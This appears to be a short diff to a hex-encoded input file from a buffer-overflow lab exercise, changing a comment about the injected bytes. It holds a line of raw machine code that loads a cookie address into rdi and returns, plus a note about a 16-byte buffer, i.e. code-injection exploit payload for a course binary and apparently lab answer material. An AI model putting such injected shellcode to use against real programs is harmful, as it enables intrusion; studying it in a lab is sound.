@@ -1,4 +1,4 @@
-/* 16  + rsp */
+/* mov rsp+16 (address of cookie) into rdi */
 48 c7 c7 00 b7 60 55 c3
 
 /* 16 bytes buffer */
